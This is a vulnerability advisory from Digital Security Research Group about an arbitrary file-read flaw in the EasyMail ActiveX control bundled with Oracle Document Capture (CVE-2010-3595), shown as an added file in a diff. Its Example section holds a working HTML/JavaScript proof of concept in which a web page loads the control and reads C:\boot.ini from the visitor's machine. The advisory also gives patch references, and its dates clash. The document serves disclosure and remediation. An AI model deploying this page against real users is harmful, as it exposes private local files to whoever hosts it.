@@ -1,0 +1,131 @@
+Source:  http://packetstormsecurity.org/files/view/97872/DSECRG-11-007.txt
+
+Digital Security Research Group [DSecRG] Advisory DSECRG-11-007 (Internal #DSECRG-00117)
+
+
+Application:                    Oracle Document Capture  
+Versions Affected:              10.1350.0005
+Vendor URL:                     http://www.oracle.com/technology/software/products/content-management/index_dc.html
+Bugs:                           Insecure READ method
+Exploits:                       YES
+Reported:                       29.01.2010 
+Second report:                  02.02.2010                    
+Date of Public Advisory:        24.01.2010  
+CVE:                            CVE-2010-3595
+Authors:                        Alexey Sintsov
+                                by Digital Security Research Group [DSecRG] (research [at] dsecrg [dot] com)
+
+
+
+Description
+***********
+
+EasyMail ActiveX  Control (emsmtp.dll)  that included into Oracle Document Capture distrib
+can be used to read any file in target system. Vulnerable method is "ImportBodyText()".
+
+
+
+Details
+*******
+
+For example if you enter filename "C:\\boot.ini" in "ImportBodyText" method then control will 
+open and read file "C:\boot.ini". Content of boot.ini will be loaded into property "BodyText" .
+
+
+Class EasyMailSMTPObj
+GUID: {68AC0D5F-0424-11D5-822F-00C04F6BA8D9}
+Number of Interfaces: 1
+Default Interface: IEasyMailSMTPObj
+RegKey Safe for Script: True
+RegKey Safe for Init: True
+KillBitSet: False
+
+
+
+Example:
+*******
+
+<HTML>
+        <HEAD>
+        <TITLE>DSECRG</TITLE>
+        </HEAD>
+        <BODY>
+        
+        <OBJECT id='ora' classid='clsid:68AC0D5F-0424-11D5-822F-00C04F6BA8D9'></OBJECT>
+
+        <SCRIPT>
+                
+        function Exploit(){
+                ora.ImportBodyText("C:\\boot.ini");             
+                document.write("Try to read c:\\boot.ini:<br><br>"+ora.BodyText);
+        }
+        Exploit();
+
+        </SCRIPT>
+</BODY>
+</HTML>
+
+
+
+References
+**********
+
+http://dsecrg.com/pages/vul/show.php?id=307
+http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html
+
+
+
+
+Fix Information
+*************
+
+Information was published in CPU Jan 2011.
+All customers can download CPU patches following instructions from: 
+
+http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html
+
+
+About
+*****
+
+Digital Security: 
+
+Is one of the leading IT security companies in CEMEA, providing information security consulting, audit and penetration testing services, ERP and SAP security assessment, certification for ISO/IEC 27001:2005 and PCI DSS and PA DSS standards.
+
+Digital Security Research Group:
+
+International subdivision of Digital Security company focused on research and software development for securing business-critical systems like: enterprise applications (ERP,CRM,SRM), technology systems (SCADA, Smart Grid) and banking software. DSecRG developed new product "ERPSCAN security suite for SAP NetWeaver" and service "ERPSCAN Online" which can help customers to perform automated security assessments and compliance checks for SAP solutions.
+
+
+Contact: research [at] dsecrg [dot] com
+http://www.dsecrg.com
+http://www.erpscan.com
+
+
+
+
+
+
+Polyakov Alexandr. PCI QSA,PA-QSA
+CTO Digital Security
+Head of DSecRG
+______________________
+DIGITAL SECURITY
+phone:  +7 812 703 1547
+        +7 812 430 9130
+e-mail: a.polyakov@dsec.ru  
+
+www.dsec.ru
+www.dsecrg.com www.dsecrg.ru
+www.erpscan.com www.erpscan.ru
+www.pcidssru.com www.pcidss.ru
+
+
+-----------------------------------
+This message and any attachment are confidential and may be privileged or otherwise protected 
+from disclosure. If you are not the intended recipient any use, distribution, copying or disclosure 
+is strictly prohibited. If you have received this message in error, please notify the sender immediately 
+either by telephone or by e-mail and delete this message and any attachment from your system. Correspondence 
+via e-mail is for information purposes only. Digital Security neither makes nor accepts legally binding 
+statements by e-mail unless otherwise agreed. 
+-----------------------------------
